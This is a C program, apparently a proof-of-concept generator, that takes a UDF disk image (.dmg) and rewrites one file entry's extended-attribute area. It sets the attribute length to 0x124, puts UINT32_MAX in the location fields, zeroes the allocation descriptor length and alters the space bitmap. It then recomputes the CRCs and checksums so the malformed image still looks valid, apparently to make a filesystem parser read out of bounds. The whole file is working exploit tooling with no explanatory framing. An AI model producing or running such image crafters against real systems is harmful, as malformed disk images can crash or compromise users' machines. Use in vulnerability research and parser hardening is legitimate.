#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

enum {
    kBlockSize = 512,
    kTargetPhysicalBlock = 291,
    kSpaceBitmapPhysicalBlock = 258,
    kSpaceBitmapTag = 264,
    kFirstOriginallyFreeLogicalBlock = 35,
    kExtendedFileEntryTag = 266,
    kTargetLogicalBlock = 34,
    kInformationLengthOffset = 56,
    kObjectSizeOffset = 64,
    kExtendedAttributeLengthOffset = 208,
    kAllocationDescriptorLengthOffset = 212,
    kExtendedAttributeOffset = 216,
    kExtendedAttributeHeaderLength = 24,
    kExtendedAttributeLength = 0x124,
    kShortFileTimesLength = 0x14,
};

static uint16_t
load_le16(const uint8_t *p)
{
    return (uint16_t)p[0] | ((uint16_t)p[1] << 8);
}

static uint32_t
load_le32(const uint8_t *p)
{
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
        ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static uint64_t
load_le64(const uint8_t *p)
{
    return (uint64_t)load_le32(p) |
        ((uint64_t)load_le32(p + 4) << 32);
}

static void
store_le16(uint8_t *p, uint16_t value)
{
    p[0] = (uint8_t)value;
    p[1] = (uint8_t)(value >> 8);
}

static void
store_le32(uint8_t *p, uint32_t value)
{
    p[0] = (uint8_t)value;
    p[1] = (uint8_t)(value >> 8);
    p[2] = (uint8_t)(value >> 16);
    p[3] = (uint8_t)(value >> 24);
}

static void
store_le64(uint8_t *p, uint64_t value)
{
    store_le32(p, (uint32_t)value);
    store_le32(p + 4, (uint32_t)(value >> 32));
}

static uint16_t
udf_crc16(const uint8_t *p, size_t length)
{
    uint16_t crc = 0;

    while (length-- != 0) {
        crc ^= (uint16_t)*p++ << 8;
        for (unsigned bit = 0; bit < 8; bit++) {
            crc = (crc & 0x8000) != 0
                ? (uint16_t)((crc << 1) ^ 0x1021)
                : (uint16_t)(crc << 1);
        }
    }
    return crc;
}

static void
finish_tag(uint8_t *descriptor)
{
    uint16_t crc_length = load_le16(descriptor + 10);
    unsigned checksum = 0;

    store_le16(descriptor + 8,
        udf_crc16(descriptor + 16, crc_length));
    descriptor[4] = 0;
    for (unsigned i = 0; i < 16; i++) {
        if (i != 4)
            checksum += descriptor[i];
    }
    descriptor[4] = (uint8_t)checksum;
}

static void
write_all(int fd, const uint8_t *p, size_t length)
{
    while (length != 0) {
        ssize_t written = write(fd, p, length);

        if (written < 0) {
            perror("write");
            exit(1);
        }
        p += (size_t)written;
        length -= (size_t)written;
    }
}

int
main(int argc, char **argv)
{
    const size_t filler_length = kExtendedAttributeLength -
        kExtendedAttributeHeaderLength - kShortFileTimesLength;
    uint8_t ea_header[kExtendedAttributeHeaderLength];
    uint8_t *image, *efe, *ea, *filler, *record, *space_bitmap;
    unsigned long first_free = kFirstOriginallyFreeLogicalBlock;
    size_t done = 0;
    off_t size;
    int input, output;
    ssize_t count = 0;

    if (argc != 3 && argc != 4) {
        fprintf(stderr, "usage: %s input.dmg output.dmg [first-free-lbn]\n",
            argv[0]);
        return 2;
    }
    if (argc == 4) {
        char *end = NULL;

        errno = 0;
        first_free = strtoul(argv[3], &end, 0);
        if (errno != 0 || end == argv[3] || *end != '\0' ||
            first_free < kFirstOriginallyFreeLogicalBlock ||
            first_free >= UINT32_MAX) {
            fprintf(stderr, "invalid first-free-lbn: %s\n", argv[3]);
            return 2;
        }
    }
    input = open(argv[1], O_RDONLY);
    if (input < 0 || (size = lseek(input, 0, SEEK_END)) < 0 ||
        lseek(input, 0, SEEK_SET) < 0) {
        fprintf(stderr, "input setup failed: %s\n", strerror(errno));
        return 1;
    }
    image = malloc((size_t)size);
    if (image == NULL) {
        perror("malloc");
        return 1;
    }
    while (done != (size_t)size &&
        (count = read(input, image + done, (size_t)size - done)) > 0)
        done += (size_t)count;
    close(input);
    if (done != (size_t)size || count < 0) {
        fprintf(stderr, "short read: %zu/%lld: %s\n", done,
            (long long)size, count < 0 ? strerror(errno) : "EOF");
        return 1;
    }
    if ((size_t)size < (kTargetPhysicalBlock + 1ULL) * kBlockSize) {
        fprintf(stderr, "image too small\n");
        return 1;
    }

    efe = image + (size_t)kTargetPhysicalBlock * kBlockSize;
    space_bitmap = image +
        (size_t)kSpaceBitmapPhysicalBlock * kBlockSize;
    ea = efe + kExtendedAttributeOffset;
    if (load_le16(efe) != kExtendedFileEntryTag ||
        load_le32(efe + 12) != kTargetLogicalBlock ||
        load_le64(efe + kInformationLengthOffset) != 5 ||
        load_le64(efe + kObjectSizeOffset) != 5 ||
        load_le32(efe + kExtendedAttributeLengthOffset) != 152 ||
        load_le32(efe + kAllocationDescriptorLengthOffset) != 5 ||
        load_le16(ea) != 0x106) {
        fprintf(stderr, "unexpected target EFE geometry\n");
        return 1;
    }
    if (load_le16(space_bitmap) != kSpaceBitmapTag ||
        first_free >= load_le32(space_bitmap + 16) ||
        load_le32(space_bitmap + 20) <
        (first_free / 8) + 1) {
        fprintf(stderr, "unexpected space bitmap geometry\n");
        return 1;
    }

    for (unsigned long block = kFirstOriginallyFreeLogicalBlock;
        block < first_free; block++) {
        space_bitmap[24 + block / 8] &=
            (uint8_t)~(1U << (block % 8));
    }
    space_bitmap[24 + first_free / 8] |=
        (uint8_t)(1U << (first_free % 8));

    memcpy(ea_header, ea, sizeof(ea_header));
    memset(ea, 0, kExtendedAttributeLength);
    memcpy(ea, ea_header, sizeof(ea_header));
    store_le32(ea + 16, UINT32_MAX);
    store_le32(ea + 20, UINT32_MAX);

    filler = ea + kExtendedAttributeHeaderLength;
    store_le32(filler, 1);
    filler[4] = 0;
    store_le32(filler + 8, (uint32_t)filler_length);

    record = filler + filler_length;
    store_le32(record, 5);
    record[4] = 1;
    store_le32(record + 8, kShortFileTimesLength);
    store_le32(record + 12, 0);
    store_le32(record + 16, 0);

    store_le64(efe + kInformationLengthOffset, 0);
    store_le64(efe + kObjectSizeOffset, 0);
    store_le32(efe + kExtendedAttributeLengthOffset,
        kExtendedAttributeLength);
    store_le32(efe + kAllocationDescriptorLengthOffset, 0);
    store_le16(efe + 10, kExtendedAttributeOffset +
        kExtendedAttributeLength - 16);
    finish_tag(ea);
    finish_tag(efe);

    fprintf(stderr,
        "EA_end=0x%x AD_start=0x%x remaining=%u short_AD_size=8 first_free=%#lx\n",
        kExtendedAttributeOffset + kExtendedAttributeLength,
        kExtendedAttributeOffset + kExtendedAttributeLength,
        kBlockSize - (kExtendedAttributeOffset +
        kExtendedAttributeLength), first_free);

    output = open(argv[2], O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (output < 0) {
        perror("open output");
        return 1;
    }
    write_all(output, image, (size_t)size);
    if (fsync(output) != 0 || close(output) != 0) {
        perror("finalize output");
        return 1;
    }
    free(image);
    return 0;
}
